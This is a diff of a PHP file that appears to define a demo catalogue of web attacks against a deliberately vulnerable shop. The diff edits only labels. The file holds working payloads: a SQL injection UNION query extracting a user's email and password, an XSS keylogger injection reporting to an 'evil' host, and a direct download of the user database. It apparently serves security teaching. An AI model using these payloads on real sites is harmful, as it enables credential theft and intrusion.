@@ -4,7 +4,7 @@ include_once("init.php");
 $attacks = array();
 
 $attacks[0] = array(
-    "name" => "A1 - SQL Injection",
+    "name" => "A1 - Injection",
     "description" => "Shows email and password for a user with id 1",
     "value" => "product.php?id=0' UNION SELECT 'bla', email as name, pw as description, 'bla' FROM users WHERE id=1 --",
     "attack" => "product.php?id=0%27%20UNION%20SELECT%20%27bla%27,%20email%20as%20name,%20pw%20as%20description,%20%27bla%27%20FROM%20users%20WHERE%20id=1%20%20--");
@@ -37,14 +37,14 @@ window.setInterval(function() {
 
 $attacks[1] = array(
     "name" => "A3 - Cross-Site Scripting (XSS)",
-    "description" => "Steals password on login site!",
-    "value" => "index.php?message=&lt;script&gt;XSS-SCRIPT&lt;/script&gt;<br> XSS script contains javascript keylogger. Results can be seen <a href='http://evil.mydevelops.com'>here</a>.",
+    "description" => "Steals password on login site with key logger!",
+    "value" => "index.php?message=&lt;script&gt;XSS-SCRIPT&lt;/script&gt;<br> XSS-SCRIPT contains javascript keylogger. Results can be seen <a href='http://evil.mydevelops.com'>here</a>.",
     "attack" => "index.php?message=<script>".$xss."</script>"
 );
 
 $attacks[2] = array(
     "name" => "A5 - Security Misconfiguration",
-    "description" => "Just downloads the entire SQLite Database",
+    "description" => "Just downloads the entire SQLite Database (including users and passwords)",
     "value" => "/db/database.sqlite",
     "attack" => "/db/database.sqlite"
 );
